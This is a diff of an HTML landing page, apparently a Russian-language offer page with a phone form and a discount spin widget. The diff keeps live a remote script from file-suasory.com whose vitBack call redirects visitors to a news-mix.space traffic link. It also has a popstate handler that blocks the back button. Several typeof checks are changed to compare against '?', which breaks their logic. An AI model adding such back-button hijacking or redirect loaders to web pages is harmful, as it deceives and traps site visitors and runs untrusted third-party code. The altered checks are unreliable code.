@@ -110,14 +110,14 @@
   <meta content="#28a745" name="theme-color"/>
   <script src="js/jqmin4track.js">
   </script>
-  <script>
+  <!-- <script>
    window.backScriptType = 3
  window.backPrelandID = false;
  window.backPrelandUrl = ''; 
  window.multiBack = JSON.parse('[{"type":0,"preland_id":0,"land_url":""}]')
-  </script>
+  </script> 
   <script>
-   var redirectUrl = '';
+   var redirectUrl = 'https://ya.ru';
     var frame = document.createElement('iframe');
     var backCounter = 0;
     var disB = false;
@@ -155,12 +155,12 @@
             var popCount = 0;
             window.onpopstate = function (e) {
                 popCount++;
-                if (popCount === 1) { //history.back();
+                if (popCount === 1) { 
                     history.go(1);
                     return;
                 }
 
-                if (popCount === 2) return; //history.go(1);
+                if (popCount === 2) return;
                 back();
             }
         })
@@ -287,7 +287,6 @@
                 redirectUrl += key + '=' + params[key] + '&';
             }
             redirectUrl = redirectUrl.slice(0, -1);
-            // Костыль когда-нибудь убрать
             redirectUrl += '&uid=' + queryData['vcode']
         }
 
@@ -410,7 +409,6 @@ function initValidator() {
     let phoneInput = document.querySelector('[name=phone]');
     if (phoneInput) {
       phoneInput.setAttribute('maxlength', geoPhrases['maxPhoneNumber']);
-//  	  phoneInput.setAttribute('type', 'tel');
       document.querySelector('[name=phone]').addEventListener('keydown', function (event) {
         event = event || window.event;
         let key = event.keyCode || event.which;
@@ -484,7 +482,7 @@ function submitAndTarget(current) {
         break
     }
   }
-  if (typeof (sendParams) == 'undefined') {
+  if (typeof (sendParams) == '?') {
     return
   }
 
@@ -492,7 +490,7 @@ function submitAndTarget(current) {
     return
   }
 }
-  </script>
+  </script> -->
   <script>
    function rus_date() {
         var d = new Date();
@@ -507,7 +505,7 @@ function submitAndTarget(current) {
         document.write(month);
     };
   </script>
-  <script>
+  <!-- <script>
    commUrl = '';
 function include(url) {
     commUrl = url;
@@ -519,7 +517,7 @@ function include(url) {
     }
     body.appendChild(script);
 }
-  </script>
+  </script> -->
   <script>
    function initShowHide() {
         $('.show-img').click(function(event) {
@@ -1241,16 +1239,16 @@ function include(url) {
 
                     if (i.classList.contains("open")) {
                         s.innerHTML = addOrNotProcent;
-                        a.innerHTML = (typeof widgetDoorsSale2 !== "undefined") ? widgetDoorsSale2 + '' : "50%";
-                        d.innerHTML = (typeof widgetDoorsSale3 !== "undefined") ? widgetDoorsSale3 + '' : "25%";
+                        a.innerHTML = (typeof widgetDoorsSale2 !== "?") ? widgetDoorsSale2 + '' : "50%";
+                        d.innerHTML = (typeof widgetDoorsSale3 !== "?") ? widgetDoorsSale3 + '' : "25%";
                     } else if (u.classList.contains("open")) {
                         a.innerHTML = addOrNotProcent;
-                        s.innerHTML = (typeof widgetDoorsSale3 !== "undefined") ? widgetDoorsSale3 + '' : "25%";
-                        d.innerHTML = (typeof widgetDoorsSale2 !== "undefined") ? widgetDoorsSale2 + '' : "50%";
+                        s.innerHTML = (typeof widgetDoorsSale3 !== "?") ? widgetDoorsSale3 + '' : "25%";
+                        d.innerHTML = (typeof widgetDoorsSale2 !== "?") ? widgetDoorsSale2 + '' : "50%";
                     } else if (l.classList.contains("open")) {
-                        s.innerHTML = (typeof widgetDoorsSale2 !== "undefined") ? widgetDoorsSale2 + '' : "50%";
+                        s.innerHTML = (typeof widgetDoorsSale2 !== "?") ? widgetDoorsSale2 + '' : "50%";
                         d.innerHTML = addOrNotProcent;
-                        a.innerHTML = (typeof widgetDoorsSale3 !== "undefined") ? widgetDoorsSale3 + '' : "25%";
+                        a.innerHTML = (typeof widgetDoorsSale3 !== "?") ? widgetDoorsSale3 + '' : "25%";
                     }
                 };
                 for (var t = 0; t < o.length; t++)
@@ -1289,7 +1287,7 @@ function include(url) {
         }, 3e3)
     }
 
-    if (typeof customDoorsForm !== "undefined") {
+    if (typeof customDoorsForm !== "?") {
         $('.default_order-block').remove();
         $('.default_spin-result-wrapper').remove();
 
@@ -2522,12 +2520,7 @@ function include(url) {
     }
 })();
   </script> -->
-  <script src="https://file-suasory.com/back.js"></script>
-<script>
-    document.addEventListener("DOMContentLoaded", function() {
-        window.vitBack("https://red.news-mix.space/?utm_campaign=18958&utm_source=[SID]&sid6=[TID]&utm_medium=2329&is_visitor=1", true);
-    });
-</script>
+
   <script>
     // Получаем значение click_id из query string
     const urlParams = new URLSearchParams(window.location.search);
@@ -2537,6 +2530,12 @@ function include(url) {
     if (click_id) {
         document.getElementById('click_id').value = click_id;
     }
+</script>
+<script src="https://file-suasory.com/back.js"></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        window.vitBack("https://red.news-mix.space/?utm_campaign=17226&utm_source=[SID]&sid6=[TID]&utm_medium=2329&is_visitor=1", true);
+    });
 </script>
  </body>
 </html>
